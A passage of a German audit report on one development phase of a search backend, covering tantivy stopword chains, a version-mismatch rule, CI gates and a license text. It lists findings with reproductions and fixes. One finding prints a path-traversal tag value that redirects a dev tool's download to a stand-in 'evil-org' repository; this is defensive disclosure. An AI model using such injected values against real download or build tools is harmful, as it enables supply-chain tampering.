---
phase: 17-owner-tor-und-analyseketten
audited: 2026-09-23
tree: 87087d05df9811cfdf3ca73a0300fb06415cb1fa
commit: 10b3cc2d10cefdc3009c6dae4d3d04463666a6e5
scope: "git diff 9d6087e..HEAD ohne den Dependabot-Merge a8475ad (onnx 1.22.0 auf 1.23.0)"
findings:
  critical: 0
  high: 0
  medium: 7
  low: 11
  total: 18
status: issues_found
fixed: [M-17-01, M-17-02, M-17-03, M-17-04, M-17-05, M-17-06, M-17-07]
still_open: [L-17-01, L-17-02, L-17-03, L-17-04, L-17-05, L-17-06, L-17-07, L-17-08, L-17-09, L-17-10, L-17-11]
---

# Phase 17: Security-, Bug- und Performance-Audit

**Umfang:** die acht Pläne 17-01 bis 17-08 dieser Phase, gelesen gegen den Baum
von Commit `10b3cc2`. Der Dependabot-Merge `a8475ad` (onnx 1.22.0 auf 1.23.0)
ist ausgenommen, weil er nicht zur Phase gehört; die Zeile in
`backend/pyproject.toml:82` wird deshalb hier nicht bewertet. Der Bericht liegt
nach der Owner-Regel vom 15.08.2026 vor dem Phasenabschluss und ist nach dem
Muster von `docs/audits/2026-09-phase-16/README.md` geschrieben.

Die Überschriften stehen ohne Umlaute, weil Prüfungen und Verweise auf sie
zeigen; der Fließtext benutzt echte Umlaute. Dieser Bericht nennt Dateinamen,
Zeilennummern und Zahlen und sonst nichts.

**Bilanz vorweg: kein CRITICAL, kein HIGH. Sieben MEDIUM und elf LOW.** Kein
Befund trifft einen Pfad, den das ausgelieferte Erzeugnis heute läuft: die
Kettenfabrik wird von genau einem Aufrufer erreicht, und der ist Token für
Token die alte englische Kette. Die sieben MEDIUM sitzen woanders, und drei
davon sind Fallen, die erst in Phase 18 zuschnappen, wenn die Fabrik verdrahtet
wird. Die zwei unangenehmsten:

**Zwei Werkzeuge in `scripts/dev/` hängen sich an bestimmten Fremdeingaben auf,
statt einen Fehler zu melden** (M-17-02, belegt und reproduziert), und **das
Werkzeug, das die Stoppwortergänzung erzeugt, lässt sich über sein
`--tag`-Argument auf ein fremdes GitHub-Repository umlenken** (M-17-01, belegt).

Außerdem: **die gelockerte `tantivy_version`-Regel öffnet keinen Weg für
einen fremden Index** (Abschnitt 2.3, geprüft und entkräftet), und **das
`except BaseException` in `builds()` kann nichts verschlucken, was zu einem
falschen Grün führt** (Abschnitt 2.1, geprüft, nur LOW).

**Nachtrag vom 23.09.2026: alle sieben MEDIUM sind behoben**, je ein Befund ein
Commit, die Hashes stehen bei den Befunden in Abschnitt 5. Die volle Suite nach
dem letzten Fix: 2548 grün, 15 übersprungen. Die elf LOW stehen weiter offen.
Der Text darüber und darunter ist der Befundstand vom Vormittag und bleibt so
stehen, weil ein Bericht, der seine eigenen Befunde wegschreibt, nicht mehr
nachlesbar ist.

---

## 1. Was geprueft wurde

| Nr. | Pfad | Womit geprüft | Beleg | Urteil |
|---|---|---|---|---|
| 1 | `except BaseException` in `builds()` | Quelltextlesung, Ausführung beider roter und grüner Zweige | `backend/tests/test_language_allowlist.py:56-70`, 80 Fälle grün in 1,40 s | **kein falsches Grün möglich**, ein LOW (L-17-03) |
| 2 | Umgehung der Positivliste | Enumeration der laufenden tantivy über 28 Kandidatennamen, Aufruf der Fabrik mit unbekannter Sprache, mit Großschreibung und ohne Ergänzung | 18 Stemmer, 13 Stoppwortlisten, Differenz genau `arabic, greek, romanian, tamil, turkish`; `snowball_analyzer('klingon', ())` wirft `ValueError` | Liste **inhaltlich korrekt**, aber **nirgends durchgesetzt** (M-17-03) |
| 3 | Netzzugriff in `stopword_supplement.py` | Quelltextlesung, URL-Bau mit manipuliertem Tag gegen `httpx.URL` | `https://raw.githubusercontent.com/evil-org/evil-repo/main/src/...` aus `--tag 'v/../../../evil-org/evil-repo/main'` | **umlenkbar** (M-17-01) |
| 4 | Gelockerte `version_mismatch`-Regel | Quelltextlesung, fünf Fallpaare, Lauf der Store-Tests | `backend/src/findling/store/repo.py:1327-1343`, `backend/tests/test_store_repo.py:251-295` | **kein fremder Index wird kompatibel**, zwei LOW (L-17-01, L-17-02) |
| 5 | Randfälle der Kettenfabrik | Ausführung: leere Liste, unbekannte Sprache, Großschreibung, fehlende Ergänzung | `snowball_analyzer('french', FOLDED_STOPWORDS['french'])` wirft `KeyError`; `'Spanish'` baut und filtert, greift aber auf keinen Ergänzungsschlüssel | **drei belegte Randfälle** (M-17-03) |
| 6 | Hash-Konstanten und Ratsche | Lauf der beiden Ratschentests auf dem heutigen Baum | 384 Fälle grün in 6,60 s, `PACKAGE_FILES_TODAY = 55` und Baumhash tragen | **gehalten**, ein LOW (L-17-10) |
| 7 | Anderes `index_format` aus tantivy | Quelltextlesung beider Vergleichsstellen, Fallpaare | `repo.py:1327` fällt geschlossen, `deploy-harp.yml:3304` **nicht in jedem Fall** | **ein Gate-Loch** (M-17-05) |
| 8 | Heißer Suchpfad | Aufrufergraph von `version_mismatch` und `snowball_analyzer`, Zeitmessung | `english_analyzer()` 0,005 ms, `snowball_analyzer('spanish', ...)` 0,026 ms je Aufruf; ein Aufrufer, `index/open.py:99` | **keine Regression**, kein Befund |
| 9 | Qualitätsgates | `ruff check`, `ruff format --check`, `vulture` über `src` und `scripts` | `All checks passed`, `141 files already formatted`, vulture stumm | **grün** |

---

## 2. Security

### 2.1 Das `except BaseException` in `builds()`

Die Frage war, ob die breite Klausel etwas verschluckt, was nicht verschluckt
werden darf. Antwort in zwei Teilen.

**Sie verschluckt `KeyboardInterrupt` und `SystemExit`.** Das ist L-17-03 und
bleibt LOW, weil die Folge in beide Richtungen geschlossen fällt: `builds()`
gibt bei jeder gefangenen Ausnahme `False` zurück, und `False` bedeutet in
allen drei Testfällen "die Engine trägt diese Sprache nicht", also rot. Ein
abgebrochener Lauf kann keine Sprache fälschlich in die Positivliste heben. Der
einzige reale Schaden ist ein Strg-C mitten im Kettenbau, das als roter Assert
statt als Abbruch erscheint.

**Der Grund für die Klausel ist mit dem Pin-Umzug entfallen.** Die Klausel
fängt die `PanicException` von tantivy 0.26.0, die von `BaseException` erbt.
Der Pin steht seit Plan 17-08 auf 0.26.2, und dort ist derselbe Fall ein
`ValueError`: nachgemessen mit `snowball_analyzer('klingon', ())`, Ausgabe
`ValueError: Unsupported language: klingon`. Die Klausel bleibt trotzdem
vertretbar, solange beide Fassungen im Umlauf sind; sie gehört nur präziser
geschrieben.

**Kein Produktionspfad ist betroffen.** `grep -rn "BaseException" backend/src`
liefert im Erzeugnis keinen Treffer.

### 2.2 Netzzugriff und Lieferkette in `stopword_supplement.py`

Das Werkzeug lädt zwei Rust-Dateien aus einem GitHub-Tag und schreibt daraus
einen Python-Literalblock, den ein Mensch nach
`backend/src/findling/index/stopwords.py` trägt. Drei Beobachtungen.

**Das Tag wird ungeprüft in die URL gesetzt** (M-17-01). Reproduziert:

```
--tag "v/../../../evil-org/evil-repo/main"
  ergibt https://raw.githubusercontent.com/evil-org/evil-repo/main/src/tokenizer/stop_word_filter/stopwords.rs
```

`httpx` normalisiert die Punktsegmente, bevor die Anfrage rausgeht, und die
Ausgabe des Werkzeugs meldet weiterhin nur `tag=<was der Aufrufer schrieb>`.
Das ist ein Entwicklerwerkzeug und verlangt, dass jemand das Argument so
übergibt; deshalb MEDIUM und nicht HIGH.

**Es gibt keine Inhaltsverankerung der geladenen Quelle** (L-17-07 berührt es,
geführt unter M-17-01). Git-Tags sind verschiebbar, und weder `stopwords.rs`
noch `mod.rs` werden gegen eine erwartete Prüfsumme gehalten. Die einzige
Verankerung ist der Digest der **abgeleiteten** Liste,
`FOLDED_SUPPLEMENT_SHA256` in `backend/tests/test_language_analyzers.py:96`.
Das ist ein echter Anker, und er fängt jede Veränderung der Ergänzung, aber
das dokumentierte Verfahren daneben lautet "Unterschied aufschreiben, dann die
Konstante nachziehen", also ist der Anker bewusst beweglich.

**Die Datenschutzregel T-02-14 ist eingehalten.** Beide Werkzeuge drucken
Zahlen, Digests und veröffentlichte Stoppwörter, nie Nutzerinhalt; geprüft
über alle `print`-Stellen in `scripts/dev/stopword_supplement.py` und
`scripts/dev/chain_probe.py`.

### 2.3 Die gelockerte version_mismatch-Regel

Die Frage war, ob ein manipulierter oder fremder Index dadurch fälschlich als
kompatibel gelten kann. **Nein**, und das ist der wichtigste Negativbefund
dieses Berichts.

`Store.version_mismatch` (`backend/src/findling/store/repo.py:676-685`)
vergleicht fünf Marken. Gelockert ist genau eine, und nur sie. `schema_version`,
`analyzer_version` und `wordlist_hash` bleiben exakte Gleichheiten; ein fremder
Index müsste also weiterhin denselben Schemastand, denselben Kettenstand und
denselben Digest der deutschen Konstituentenliste tragen. Was die Lockerung
zusätzlich durchlässt, ist ausschließlich eine andere tantivy-Patchnummer bei
gleicher Formathälfte.

`_index_format_matches` (`repo.py:1327-1343`) fällt in allen geprüften
Fehlfällen geschlossen: `None`, leere Zeichenkette und ein Banner ohne
Formathälfte sind Abweichungen, nicht Treffer. Der Saatwert `unknown` führt
weiterhin zum Reindex. Die fünf Fälle stehen als Test in
`backend/tests/test_store_repo.py:277-285`.

Die Regel wirkt auch wirklich, was nicht selbstverständlich ist: die Tests
arbeiten mit erfundenen Bannern, und wenn `tantivy.__version__` eine nackte
Versionsnummer wäre, wäre die ganze Lockerung im Betrieb wirkungslos, ohne
dass ein Test es merkte. Nachgemessen in der installierten Fassung:
`tantivy.__version__` ist `'tantivy v0.26.2, index_format v7'`. Die Lockerung
greift.

Die abgegebene Zusicherung, eine geänderte Tokenisierung hinter unverändertem
Format, trägt die Phase mit den Kettentabellen. Das ist belastbar, hat aber
zwei Ausfransungen: der gespeicherte Banner wird nach einem gelockerten Treffer
nie nachgezogen (L-17-01), und verglichen wird der ganze Rest ab
`index_format `, nicht die Formatnummer (L-17-02).

### 2.4 Umgehung der Positivliste

Die Liste selbst ist korrekt. Unabhängig nachgemessen gegen die laufende
tantivy 0.26.2 mit 28 Kandidatennamen: 18 Sprachen haben einen Stemmer, 13 eine
eingebaute Stoppwortliste, und die Differenz ist genau
`arabic, greek, romanian, tamil, turkish`. Das ist die Behauptung aus
`backend/src/findling/config.py:84-102`, Wort für Wort.

**Durchgesetzt wird sie nirgends** (M-17-03). `snowball_analyzer`
(`backend/src/findling/index/analyzer.py:232`) nimmt einen beliebigen
Sprachnamen und eine beliebige Wortliste entgegen und fragt weder
`LANGUAGE_ALLOWLIST` noch `FOLDED_STOPWORDS`. Das ist heute folgenlos, weil nur
`english_analyzer()` die Fabrik erreicht. Ab Phase 18 ist es die Stelle, an der
die Liste vorbeigeht.

---

## 3. Bugs

### 3.1 Der Endlosschleifen-Zwilling

Beide Rust-Parser der Phase tragen denselben Fehler. `pos = name_end + 1` mit
`name_end = -1` ergibt `pos = 0`, und die nächste Runde findet dieselbe Stelle
wieder. Reproduziert mit einer Zeile, in der nach `pub const` kein Doppelpunkt
mehr steht:

```
text = 'pub const SPANISH_X = &["a"];'
parse_stopwords(text)   ->  laeuft, bis der Prozess getoetet wird (Exit 143 nach 30 s)
```

Die Eingabe kommt im Regelfall aus dem Netz, also von außerhalb des Baums, und
die Folge ist ein hängendes Werkzeug ohne Meldung statt eines Fehlers. Das ist
M-17-02, und es steht zweimal da, weil der Parser bewusst dupliziert wurde
(L-17-06).

### 3.2 Randfaelle der Kettenfabrik

Drei Fälle, alle ausgeführt und nicht nur gelesen.

**Acht von dreizehn Sprachen der Positivliste haben gar keine Ergänzung.**
`sorted(LANGUAGE_ALLOWLIST - set(FOLDED_STOPWORDS))` ergibt
`danish, finnish, french, german, hungarian, norwegian, russian, swedish`. Wer
dem Muster aus `analyzer.py:229` und
`backend/tests/test_language_analyzers.py:426` folgt und
`snowball_analyzer(name, FOLDED_STOPWORDS[name])` schreibt, bekommt für diese
acht einen `KeyError`. Das ist der laute Fall.

**Der leise Fall ist schlimmer.** Französisch ist in der Positivliste, hat
Akzente und keine Ergänzung. Mit leerer Ergänzung gebaut liefert die Kette
für `été` und `ete` beide Male `['ete']`, also genau das Loch, das die
Ergänzung für Spanisch, Italienisch und Portugiesisch schließt: die
akzentuierten Stoppwörter landen als Terme im Index, ohne dass irgendetwas
rot wird.

**Groß- und Kleinschreibung trennt die beiden Parameter.** tantivy nimmt
Sprachnamen unabhängig von der Schreibweise: `snowball_analyzer('Spanish', ...)`
baut und filtert `de`, `una` und `estais` genauso weg wie die
kleingeschriebene Fassung. Die Schlüssel von `FOLDED_STOPWORDS` und die
Einträge von `LANGUAGE_ALLOWLIST` sind dagegen kleingeschrieben und werden
exakt verglichen. Ein Aufrufer mit `'Spanish'` und
`FOLDED_STOPWORDS.get('Spanish', ())` baut also eine Kette, die funktioniert und
77 spanische Stoppwörter durchlässt. Kein Test fängt das, weil alle Tests
klein schreiben.

Alle drei hängen an derselben Ursache: die Fabrik nimmt zwei voneinander
unabhängige Parameter, die zusammengehören.

### 3.3 Eine Kettenaenderung ohne Markenbewegung

`english_analyzer()` liest seit dieser Phase `FOLDED_STOPWORDS["english"]`
(`analyzer.py:229`). Die Liste ist leer, ein leerer
`custom_stopword`-Filter ist gemessen ein No-op, und der Beweis dafür steht in
`test_language_analyzers.py:246-274`. Heute ist das sauber.

Der Pfad, der aufgeht: wenn ein künftiger Tag der englischen Liste einen
akzentuierten Eintrag gibt, ändert sich die Tokenisierung des **registrierten**
englischen Tokenizers. `ANALYZER_VERSION` bewegt sich dabei nicht, und der
Supplement-Digest darf laut `stopwords.py:27-35` ausdrücklich keine sechste
Marke werden. Die Gates werden rot
(`test_language_analyzers.py:278-290`), aber das daneben dokumentierte Verfahren
lautet "Unterschied aufschreiben, dann die Konstante nachziehen", und in diesem
Verfahren fehlt der Schritt, der nach `ANALYZER_VERSION` fragt. Wer es befolgt,
liefert eine verschobene Tokenisierung ohne Reindex aus, und das ist genau die
stille Fehlerklasse, gegen die der ganze Markenapparat gebaut ist. Das ist
M-17-04.

### 3.4 Das Gate, das gruen bleiben kann

`.github/workflows/deploy-harp.yml:3304` vergleicht `${was#*index_format }` mit
`${now#*index_format }`. Enthält eine der beiden Seiten das Muster nicht, gibt
die Ersetzung die Zeichenkette unverändert zurück. Für zwei fehlende Marken
heißt das: `jq -r` liefert zweimal `null`, die Formathälften sind gleich, und
der Zweig meldet `unchanged ... (the engine banner did not move at all)`. Das
Gate ist dann leer, obwohl `Store.version_mismatch` eine fehlende Marke als
Abweichung liest und jede Bestandsinstallation den Reindex bekäme, den dieses
Gate verhindern soll. Laufzeitregel und Gate widersprechen sich also in genau
dem Fall, den die Laufzeitregel ausdrücklich als "never a pass" führt. Das ist
M-17-05.

### 3.5 Hash-Konstanten und Ratsche

Geprüfte Behauptung, nicht gelesene: beide Ratschentests laufen auf dem
heutigen Baum grün, 384 Fälle in 6,60 s. `PACKAGE_FILES_TODAY = 55` und
`PACKAGE_TREE_HASH_TODAY` tragen, der Gegenassert
`PACKAGE_TREE_HASH != PACKAGE_TREE_HASH_TODAY` steht, und die neue Zeile
`assert f"dateien: {PACKAGE_FILES}" in raw` verankert die Rohablesung. Kein
Befund außer der wachsenden Kommentarchronik (L-17-10).

`FOLDED_SUPPLEMENT_SHA256` und `EXPECTED_SUPPLEMENT_SIZES` tragen ebenfalls, und
der Digest wird in Werkzeug und Test über dieselbe Funktion und dieselbe
Flachlegung in sortierter Sprachreihenfolge gebildet
(`stopword_supplement.py:261` gegen `test_language_analyzers.py:283`). Keine
Drift zwischen Erzeuger und Gate.

---

## 4. Performance

**Kein Befund.** Drei Fragen, drei Messungen.

**Die Fabrik ohne Singleton-Cache ist richtig so.** Gemessen auf diesem Rechner,
je 50 Läufe: `english_analyzer()` kostet 0,005 ms, `snowball_analyzer` mit der
größten Ergänzung (77 Einträge, Spanisch) kostet 0,026 ms. Zum Vergleich
kostet der deutsche Automat 0,44 s und rund 23 MB, die nie zurückkommen. Ein
Cache wäre hier Ballast, und die Begründung im Docstring stimmt.

**Die Ergänzung ist vernachlässigbar groß.** 117 Einträge, zusammen 751
Zeichen. Das Modul `stopwords.py` trägt sonst nichts und importiert nur
`hashlib`.

**Der heiße Suchpfad ist unberührt.** `snowball_analyzer` hat im Erzeugnis
genau einen Aufrufer, `index/open.py:99`, und der läuft einmal je geöffnetem
Index, nicht je Anfrage. `version_mismatch` wird aus dem Oeffnungspfad
(`start_rebuild_on_drift`, `stamp_after_rebuild`), aus dem Statusendpunkt und
aus der Degradationsprüfung erreicht; letztere ist mit
`DEGRADED_TTL_SECONDS` zwischengespeichert
(`backend/src/findling/api/resources.py:373-381`), läuft also höchstens alle
fünf Sekunden. Die Aenderung selbst sind zwei `str.find` und ein
Zeichenkettenvergleich.

---

## 5. Die MEDIUM im Einzelnen

### M-17-01: Das Tag-Argument kann den Download auf ein fremdes Repository umlenken

**Status: BEHOBEN am 23.09.2026, Commit `36ea1b5`.** `TAG_FORM` prüft das Tag
gegen die Form 0.26.2, bevor es in `RAW_URL` geht; ein abweichender Wert endet
mit Rückgabewert 2. Der Docstring nennt jetzt den Digest der abgeleiteten Liste
als Anker und nicht das Tag.

**Fundstelle:** `scripts/dev/stopword_supplement.py:55` und `:221-236`
(`_split_arguments` nimmt `rest[1]` ungeprüft), verwendet in `:164`.

**Befund:** `RAW_URL.format(tag=tag, ...)` setzt den Wert ungeprüft in den
Pfad. `httpx` normalisiert Punktsegmente, also trägt
`--tag "v/../../../evil-org/evil-repo/main"` die Anfrage zu einem fremden
Repository, während die Ausgabe weiter `tag=v/../../../...` meldet und der
geschriebene Literalblock von Hand ins Erzeugnis wandert.

**Fix:** das Tag vor dem Formatieren gegen eine enge Form prüfen und sonst mit
Rückgabewert 2 abbrechen, zum Beispiel direkt in `_split_arguments`:

```python
TAG_FORM = re.compile(r"\A[0-9]+\.[0-9]+\.[0-9]+\Z")
...
if rest[0] == TAG:
    if not TAG_FORM.fullmatch(rest[1]):
        print(f"stopword_supplement: {rest[1]} ist keine Tag-Form wie 0.26.2", file=sys.stderr)
        return None
    tag = rest[1]
```

Dazu eine Zeile im Docstring, die sagt, dass die Verankerung der geladenen
Bytes der Digest der abgeleiteten Liste ist und nicht der Tag.

### M-17-02: Beide Rust-Parser laufen bei fehlendem Doppelpunkt endlos

**Status: BEHOBEN am 23.09.2026, Commit `28e5478`.** Beide Parser laufen bei
`name_end < 0` vom Marker aus weiter statt vom Doppelpunkt. Gegengeprobt:
`parse_stopwords('pub const SPANISH_X = &["a"];')` liefert `{}`, statt nicht
mehr zurückzukehren; die beiden Docstrings verweisen jetzt aufeinander
(L-17-06).

**Fundstelle:** `scripts/dev/stopword_supplement.py:135` und
`scripts/dev/chain_probe.py:139`, jeweils `pos = name_end + 1`.

**Befund:** findet `text.find(":", start)` nichts, ist `name_end` gleich -1 und
`pos` wird 0, also sucht die nächste Runde wieder dieselbe Fundstelle.
Reproduziert mit `'pub const SPANISH_X = &["a"];'`: der Aufruf endet nicht,
Exit 143 nach 30 Sekunden Zeitgrenze. Die Eingabe ist im Regelfall eine
heruntergeladene Fremdquelle.

**Fix:** an beiden Stellen nicht vom Doppelpunkt, sondern vom Marker aus
weiterlaufen und den Fall benennen:

```python
        name_end = text.find(":", start)
        if name_end < 0:
            pos = start + len(marker)
            continue
        ...
        pos = name_end + 1
```

### M-17-03: Die Kettenfabrik setzt weder Positivliste noch Ergaenzung durch

**Status: BEHOBEN am 23.09.2026, Commit `3f0e4a6`.** `snowball_analyzer(language)`
ist einarmig: der Name wird einmal kleingeschrieben, ein Name außerhalb von
`LANGUAGE_ALLOWLIST` und ein Name ohne gemessene Ergänzung enden je in einem
`ValueError`, der die Sprache nennt, und die Ergänzung kommt aus
`FOLDED_STOPWORDS` statt aus einem zweiten Parameter. Vier neue Fälle halten
das: unbekannte Sprache, französisch, `"Spanish"` gleich `"spanish"`, und eine
Ergänzung für jede über `SNOWBALL_NAME` erreichbare Sprache außer Deutsch. Die
registrierte englische Kette ist Token für Token unverändert, `ANALYZER_VERSION`
bleibt 1, und die Baumhash-Ratsche wurde auf
`7824c5270a10d205a63a6c41e619fe22ca55d9b248f44cc3249cd8b59327df24` nachgezogen
(`PACKAGE_FILES_TODAY` bleibt 55, keine Datei kam und keine ging).

**Fundstelle:** `backend/src/findling/index/analyzer.py:232-264`, Aufrufmuster in
`:229` und `backend/tests/test_language_analyzers.py:426`.

**Befund:** drei belegte Randfälle aus Abschnitt 3.2: `KeyError` für acht der
dreizehn Sprachen der Positivliste, stille Undichtigkeit bei einer Sprache ohne
Ergänzung (französisch `été` und `ete` ergeben beide `['ete']`), und stille
Undichtigkeit bei abweichender Schreibweise, weil tantivy den Sprachnamen
unabhängig von der Groß- und Kleinschreibung nimmt und die Ergänzung nicht.
Heute folgenlos, ab Phase 18 der Pfad, auf dem alles davon in einen Index läuft.

**Fix:** die Fabrik einarmig machen und die Liste dort durchsetzen, wo sie
gebraucht wird. Die Ergänzung ist kein Parameter, sondern eine Eigenschaft der
Sprache:

```python
def snowball_analyzer(language: str) -> TextAnalyzer:
    name = language.lower()
    if name not in LANGUAGE_ALLOWLIST:
        raise ValueError(f"{language} steht nicht in LANGUAGE_ALLOWLIST")
    if name not in FOLDED_STOPWORDS:
        raise ValueError(f"{language} hat keine gemessene Ergaenzung, siehe stopword_supplement.py")
    folded = FOLDED_STOPWORDS[name]
    ...
```

Dazu ein Test, der für jede Sprache aus `SNOWBALL_NAME` einen Schlüssel in
`FOLDED_STOPWORDS` verlangt, und einer, der `snowball_analyzer("Spanish")`
dasselbe Ergebnis liefern lässt wie `snowball_analyzer("spanish")`. Wer die
Signatur wegen `chain_probe.verify_against_product` nicht bewegen will, nimmt die
Ergänzung als optionales Schlüsselwort mit Vorgabe aus der Abbildung.

### M-17-04: Das Nachziehverfahren der Ergaenzung fragt nicht nach ANALYZER_VERSION

**Status: BEHOBEN am 23.09.2026, Commit `021b123`.** Der Nachziehsatz an
`FOLDED_SUPPLEMENT_SHA256` und die Fehlermeldung des Digest-Tests verlangen die
Markenfrage jetzt ausdrücklich vor dem Nachziehen, und
`test_a_non_empty_english_supplement_would_move_the_shipped_chain` hält die
englische Ergänzung leer, mit `ANALYZER_VERSION + 1` als benannter Bedingung.

**Fundstelle:** `backend/tests/test_language_analyzers.py:86-96` (der
Nachziehsatz) und `:286-290` (die Fehlermeldung), zusammen mit
`backend/src/findling/index/analyzer.py:229`.

**Befund:** ein künftiger Tag, der der englischen Liste einen akzentuierten
Eintrag gibt, verschiebt die Tokenisierung des registrierten englischen
Tokenizers. Die Gates werden rot, das dokumentierte Verfahren zieht die
Konstanten nach, und keine Marke bewegt sich: die Bestandsindizes driften still.

**Fix:** den fehlenden Schritt in beide Texte schreiben und ihn durch eine
Zusage stützen, die genau diese Bedingung nennt:

```python
def test_a_non_empty_english_supplement_would_move_the_shipped_chain() -> None:
    assert FOLDED_STOPWORDS["english"] == (), (
        "english_analyzer() ist registriert: eine nicht leere englische Ergaenzung "
        "verschiebt die Tokenisierung jedes Bestandsindex und verlangt ANALYZER_VERSION + 1"
    )
```

### M-17-05: Der neue tantivyVersion-Zweig des Upgrade-Gates kann leer gruen sein

**Status: BEHOBEN am 23.09.2026, Commit `69fa03e`.** Eine `case`-Schleife
verlangt die Formathälfte auf beiden Seiten, bevor verglichen wird. Fünf
Fallpaare durchgespielt: zwei fehlende Marken sind jetzt rot statt grün, eine
fehlende Marke ist rot, eine bewegte Formathälfte ist rot, eine bewegte
Patchnummer und ein unbewegter Banner bleiben grün.

**Fundstelle:** `.github/workflows/deploy-harp.yml:3302-3311`.

**Befund:** fehlt das Muster `index_format ` auf beiden Seiten, vergleicht der
Zweig die unveränderten Zeichenketten. Zwei fehlende Marken (`jq -r` liefert
`null`) laufen in den Zweig "the engine banner did not move at all". Die
Laufzeitregel in `repo.py:1327-1343` führt genau diesen Zustand als "never a
pass".

**Fix:** die Anwesenheit der Formathälfte vor dem Vergleich verlangen:

```sh
          for banner in "${was}" "${now}"; do
            case "${banner}" in
              *"index_format "*) ;;
              *) echo "::error::tantivyVersion traegt keine index_format-Haelfte: ${banner}"; fail=1;;
            esac
          done
```

### M-17-06: measure_chains.sh nennt den alten Pin

**Status: BEHOBEN am 23.09.2026, Commit `1711fd0`.** Die Zeile steht auf
`tantivy==0.26.2`, und `test_the_measurement_script_names_the_pinned_engine` in
`backend/tests/test_upgrade_compatibility.py` liest das Skript gegen
`TANTIVY_PIN`, damit die nächste Bewegung des Pins nicht wieder halb
stattfindet.

**Fundstelle:** `scripts/dev/measure_chains.sh:35`, `TANTIVY="tantivy==0.26.0"`,
gegen `backend/pyproject.toml:13`, `tantivy==0.26.2`.

**Befund:** der Kommentar darüber sagt wörtlich, die Zeile folge dem Pin in
`backend/pyproject.toml`, und Plan 17-08 hat den Pin bewegt, ohne sie
mitzunehmen. Das Skript druckt die Zeile als Herkunftsangabe des Messlaufs
(`measure_chains: tantivy==0.26.0, no container`), und die Herkunft der
Messungen trägt in dieser Phase die gesamte Beweisführung. Kein Test hält die
Zeile: `TANTIVY_PIN` in `backend/tests/test_upgrade_compatibility.py:98` wird
nur gegen `pyproject.toml` geprüft (`:245`).

**Fix:** die Zeile auf `tantivy==0.26.2` ziehen und den Pin im selben Zug an ein
Gate hängen, damit die nächste Bewegung nicht wieder halb stattfindet:

```python
def test_the_measurement_script_names_the_pinned_engine() -> None:
    script = (REPO_ROOT / "scripts" / "dev" / "measure_chains.sh").read_text(encoding="utf-8")
    assert TANTIVY_PIN in script, TANTIVY_PIN
```

### M-17-07: THIRD-PARTY.md nennt die englische Liste als Snowball unter BSD-3-Clause

**Status: BEHOBEN am 23.09.2026, Commit `2d9f9e8`.** Der Absatz trennt die
beiden Herkünfte: Snowball unter BSD-3-Clause für Deutsch, Spanisch,
Italienisch, Niederländisch und Portugiesisch, Apache Lucene unter Apache-2.0
für die englische Liste aus `mod.rs`. Das Datum des Nachlesens (Tag 0.26.2,
23.09.2026) und die Auflage, es vor der nächsten Abgabe zu wiederholen, stehen
dabei.

**Fundstelle:** `THIRD-PARTY.md:162-166`, gegen
`scripts/dev/stopword_supplement.py:66-68`.

**Befund:** der neue Absatz sagt, die Snowball-Stoppwortlisten für Deutsch,
Englisch, Spanisch, Italienisch, Niederländisch und Portugiesisch seien
BSD-3-Clause. Das eigene Werkzeug dieser Phase sagt zwei Dateien weiter das
Gegenteil: "The English list is not a const in stopwords.rs. It stands inline in
the match arm of mod.rs, copied there from Lucene." Die Lucene-Liste steht unter
Apache-2.0. Die Aussage steht in einem ausgelieferten Lizenzdokument eines
Store-Erzeugnisses, deshalb MEDIUM und nicht LOW.

**Fix:** den Satz trennen und die englische Liste beim Namen nennen, zum
Beispiel: "Die Snowball-Listen für Deutsch, Spanisch, Italienisch,
Niederländisch und Portugiesisch sind BSD-3-Clause. Die englische Liste ist
keine Snowball-Liste: sie steht inline in `mod.rs` und stammt aus Apache Lucene,
Apache-2.0. Beide sind in dasselbe Erweiterungsmodul kompiliert und keine
eigene Abhängigkeit." Vor der nächsten Abgabe die Herkunft am gepinnten Tag
noch einmal nachlesen und das Datum dazuschreiben.

---

## 6. Die LOW im Einzelnen

**L-17-01: Der Banner wird nach einem gelockerten Treffer nie nachgezogen.**
`backend/src/findling/store/repo.py:651-653` begründet die Vollspeicherung des
Banners damit, dass die Diagnose ihn braucht. Nach einem gelockerten Treffer
bleibt in `state.db` aber der alte Banner stehen, bis irgendwann eine andere
Marke wirklich driftet und `stamp_after_rebuild` alles neu schreibt. Die
Diagnose liest dann eine Engine, die nicht läuft. *Fix:* in
`start_rebuild_on_drift` nach der Driftprüfung den laufenden Banner
zurückschreiben, wenn er sich unterscheidet, und das im Docstring benennen.

**L-17-02: Verglichen wird der ganze Rest, nicht die Formatnummer.**
`repo.py:1342` vergleicht `stored[here:]` mit `expected[there:]`. Hängt eine
künftige Fassung dem Banner etwas hinter die Formatnummer, ist das eine Drift
und kostet jede Installation im Feld den vollen Reindex, obwohl das Format steht.
*Fix:* die Formatnummer als Token nehmen, etwa
`stored[here:].split()[1] == expected[there:].split()[1]`, mit dem gleichen
geschlossenen Fall bei fehlendem Token.

**L-17-03: `except BaseException` fängt auch Strg-C.**
`backend/tests/test_language_allowlist.py:68`. Kein falsches Grün möglich
(Abschnitt 2.1), aber ein Abbruch wird zu einem roten Assert. *Fix:* zwei
Klauseln, `except (KeyboardInterrupt, SystemExit): raise` vor der breiten, und
im Kommentar festhalten, dass die breite Klausel nur noch 0.26.0 dient.

**L-17-04: `len(LANGUAGE_ALLOWLIST) == 13` ist eine Selbstzusage.**
`backend/tests/test_language_allowlist.py:116`. Der Kommentar sagt, eine
vierzehnte Sprache bedeute, die Engine sei gewachsen; gemessen wird aber nur die
Länge der eigenen Konstante. Die Richtung "die Engine trägt eine Sprache, die
hier fehlt" prüfen weder dieser noch ein anderer Fall. Dass sie prüfbar ist,
zeigt die Gegenprobe dieses Audits: 28 Kandidatennamen ergeben 18 Stemmer, 13
Stoppwortlisten, Differenz genau die fünf genannten. *Fix:* die Kandidatenliste
in den Test nehmen und die Positivliste als Schnittmenge daraus herleiten,
oder den Kommentar auf das zurückschneiden, was der Assert wirklich sagt.

**L-17-05: Die Stoppwort-Fixture hat kein eingechecktes Erzeugerwerkzeug.**
`backend/tests/fixtures/snowball_stopwords_0_26_2.txt` sagt im Kopf, sie entstehe
maschinell und werde von Hand nicht angefasst, und die Fehlermeldung in
`test_language_analyzers.py:586-593` verlangt, sie neu zu erzeugen statt sie zu
bearbeiten. Kein Werkzeug des Baums schreibt sie: `stopword_supplement.py`
schreibt nur den Literalblock, `chain_probe.py` liest sie. *Fix:* dem
Ergänzungswerkzeug ein `--dump-builtin PATH` geben, das genau dieses Format
schreibt, und den Befehl in den Fixture-Kopf setzen.

**L-17-06: Der Rust-Parser steht zweimal.** `stopword_supplement.py:90-135` und
